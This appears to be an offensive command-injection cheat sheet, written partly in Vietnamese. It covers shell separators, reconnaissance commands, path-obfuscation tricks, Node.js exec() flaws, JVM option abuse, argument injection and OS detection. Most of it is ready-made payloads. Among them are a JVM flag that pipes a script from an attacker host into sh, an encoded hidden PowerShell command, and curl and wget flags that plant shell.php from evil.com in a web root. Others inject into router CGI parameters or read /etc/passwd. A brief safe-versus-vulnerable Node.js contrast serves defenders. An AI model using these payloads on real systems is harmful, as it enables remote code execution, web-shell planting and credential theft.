# OS-Specific Command Injection Techniques

## Command Separators Comparison

### Linux Shell

| Operator | Behavior | Works in sh | Works in bash |
|----------|----------|-------------|---------------|
| `;` | Sequential execution | ✓ | ✓ |
| `\|` | Pipe stdout to next cmd | ✓ | ✓ |
| `\|\|` | OR: run if prev fails | ✓ | ✓ |
| `&&` | AND: run if prev succeeds | ✓ | ✓ |
| `&` | Background execution | ✓ | ✓ |
| `\n` (newline) | Command separator | ✓ | ✓ |
| `` `cmd` `` | Command substitution | ✓ | ✓ |
| `$(cmd)` | Command substitution | ✓ | ✓ |

### Windows CMD

| Operator | Behavior | Works in CMD | Works in PowerShell |
|----------|----------|--------------|---------------------|
| `&` | Sequential execution | ✓ | ✓ |
| `\|` | Pipe | ✓ | ✓ |
| `\|\|` | OR: run if prev fails | ✓ | ✓ |
| `&&` | AND: run if prev succeeds | ✓ | ✓ |
| `;` | Statement separator | ✗ | ✓ |
| Newline | Command separator | ✓ | ✓ |

**Key Difference**: `;` KHÔNG hoạt động trong Windows CMD, chỉ hoạt động trong PowerShell.

## Useful Commands Comparison

### System Information

| Purpose | Linux | Windows CMD | PowerShell |
|---------|-------|-------------|------------|
| Current user | `whoami` | `whoami` | `$env:USERNAME` |
| User ID/groups | `id` | `whoami /groups` | `whoami /groups` |
| Hostname | `hostname` | `hostname` | `$env:COMPUTERNAME` |
| OS version | `uname -a` | `ver` | `[System.Environment]::OSVersion` |
| System info | `cat /etc/os-release` | `systeminfo` | `Get-ComputerInfo` |

### Network

| Purpose | Linux | Windows CMD | PowerShell |
|---------|-------|-------------|------------|
| IP config | `ifconfig`, `ip a` | `ipconfig /all` | `Get-NetIPAddress` |
| Connections | `netstat -an` | `netstat -an` | `Get-NetTCPConnection` |
| Routing | `route -n` | `route print` | `Get-NetRoute` |
| DNS lookup | `nslookup`, `host`, `dig` | `nslookup` | `Resolve-DnsName` |
| ARP table | `arp -a` | `arp -a` | `Get-NetNeighbor` |

### File Operations

| Purpose | Linux | Windows CMD | PowerShell |
|---------|-------|-------------|------------|
| List files | `ls -la` | `dir` | `Get-ChildItem` |
| Read file | `cat file` | `type file` | `Get-Content file` |
| Find files | `find / -name "*.txt"` | `dir /s *.txt` | `Get-ChildItem -Recurse` |
| Create dir | `mkdir dir` | `mkdir dir` | `New-Item -ItemType Dir` |
| Delete file | `rm file` | `del file` | `Remove-Item file` |
| Copy file | `cp src dst` | `copy src dst` | `Copy-Item src dst` |
| Move file | `mv src dst` | `move src dst` | `Move-Item src dst` |

### Process Management

| Purpose | Linux | Windows CMD | PowerShell |
|---------|-------|-------------|------------|
| List processes | `ps aux` | `tasklist` | `Get-Process` |
| Kill process | `kill PID` | `taskkill /PID PID` | `Stop-Process -Id PID` |
| Running services | `systemctl list-units` | `net start` | `Get-Service` |

### User Management

| Purpose | Linux | Windows CMD | PowerShell |
|---------|-------|-------------|------------|
| List users | `cat /etc/passwd` | `net user` | `Get-LocalUser` |
| User details | `id username` | `net user username` | `Get-LocalUser username` |
| Group members | `groups user` | `net localgroup` | `Get-LocalGroupMember` |
| Admins | `grep sudo /etc/group` | `net localgroup administrators` | `Get-LocalGroupMember Administrators` |

## Environment Variable Exploitation

### Linux Character Extraction

Bash cho phép extract substring từ variables:

```bash
# Syntax: ${variable:offset:length}

# Extract / from $PATH
echo ${PATH:0:1}        # Output: /

# Common extractions
${PATH:0:1}             # /
${HOME:0:1}             # /
${PWD:0:1}              # /
${LS_COLORS:10:1}       # ; (may vary)
${IFS}                  # space/tab/newline

# Build /etc/passwd
cat ${PATH:0:1}etc${PATH:0:1}passwd
```

### Windows CMD Character Extraction

```cmd
# Syntax: %variable:~offset,length%

# HOMEPATH thường = \Users\username
%HOMEPATH:~0,1%         # \
%HOMEPATH:~6,1%         # \ (at position 6)

# COMSPEC = C:\Windows\system32\cmd.exe
%COMSPEC:~0,1%          # C
%COMSPEC:~2,1%          # \

# Build paths
dir %COMSPEC:~0,1%%COMSPEC:~2,1%Windows
```

### PowerShell Character Extraction

```powershell
# String indexing
$env:HOMEPATH[0]        # \
$env:COMSPEC[0]         # C
$env:COMSPEC[2]         # \

# Substring
$env:PATH.Substring(0,1)
```

## Node.js Specific Vulnerabilities

### exec() vs execFile()

Node.js `child_process` module có 2 functions chính:

#### Vulnerable: exec()

```javascript
const { exec } = require('child_process');

// VULNERABLE: spawns shell, allows injection
exec(`ping ${userInput}`, (err, stdout) => {
    console.log(stdout);
});

// Nếu userInput = "127.0.0.1; cat /etc/passwd"
// Shell thực thi: ping 127.0.0.1; cat /etc/passwd
```

#### Safe: execFile()

```javascript
const { execFile } = require('child_process');

// SAFE: no shell, arguments as array
execFile('ping', ['-c', '4', userInput], (err, stdout) => {
    console.log(stdout);
});

// userInput được truyền như argument, không như shell command
```

### Spawn với shell option

```javascript
const { spawn } = require('child_process');

// VULNERABLE: shell: true
spawn('ping', [userInput], { shell: true });

// SAFE: shell: false (default)
spawn('ping', ['-c', '4', userInput]);
```

### Real-world Example: Synology Photos

CVE example từ Pwn2Own Ireland 2024:

```javascript
// Vulnerable code pattern
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`);

// Attack: WebSocket event injection
// id_user = "; cat /etc/passwd #"
// = /usr/bin/do-something --id_user ; cat /etc/passwd # --payload '...'
```

## JVM Diagnostic Exploitation

Khi control được JVM arguments, có thể achieve RCE:

### Technique

```bash
# Force OOM crash
-XX:MaxMetaspaceSize=16m

# Execute command on error
-XX:OnOutOfMemoryError="<cmd>"
-XX:OnError="<cmd>"

# Force crash on OOM
-XX:+CrashOnOutOfMemoryError
```

### Payload Examples

**Windows:**

```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand <blob>"
```

**Linux:**

```
-XX:MaxMetaspaceSize=12m -XX:OnOutOfMemoryError="/bin/sh -c 'curl -fsS https://attacker/p.sh | sh'"
```

### Where to Inject

- `_JAVA_OPTIONS` environment variable
- Launcher config files
- `AdditionalJavaArguments` trong desktop agents
- Application-specific config files

## Argument Injection Techniques

Khi không thể inject shell metacharacters nhưng control được arguments:

### General Pattern

```bash
# If app runs: utility $USER_INPUT
# Inject: -malicious-flag value

# Original: curl $url
# Inject: -o /tmp/shell.php http://evil.com/shell.php
# Result: curl -o /tmp/shell.php http://evil.com/shell.php
```

### Utility-Specific Exploits

#### curl

```bash
# Write to file
-o /var/www/html/shell.php http://evil.com/shell.php

# Load config from URL
-K http://evil.com/curl.conf
```

#### wget

```bash
# Write to file
-O /var/www/html/shell.php http://evil.com/shell.php
```

#### tar

```bash
# Execute command on checkpoint
--checkpoint=1 --checkpoint-action=exec=id
```

#### ssh

```bash
# ProxyCommand execution
-o ProxyCommand="touch /tmp/pwned" user@host
```

#### zip

```bash
# Test with command execution
-T -TT 'id > /tmp/out'
```

### CGI Router Exploitation

Common pattern trong embedded devices:

```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Argument injection
topicurl=handler&param=-n

# Command injection fallback  
topicurl=setConfig&agentName=;id;
```

## OS Detection Payloads

Xác định target OS để chọn payload phù hợp:

```bash
# Try Linux-specific
; uname -a                  # Works on Linux
; cat /etc/passwd           # Linux file

# Try Windows-specific
& ver                       # Works on Windows
& type C:\Windows\win.ini   # Windows file

# Time-based detection
; sleep 5                   # Linux (sleep command)
& ping -n 5 127.0.0.1      # Windows (ping -n)
```

## Shell Detection

Xác định shell để optimize payloads:

```bash
# Check shell type
echo $0                     # sh, bash, zsh, etc.
echo $SHELL                 # Default shell path

# Bash-specific
echo ${BASH_VERSION}        # Only works in bash
echo $BASH                  # Bash path

# Sh vs Bash differences
# $(cmd) works in both
# Process substitution <() only in bash
```
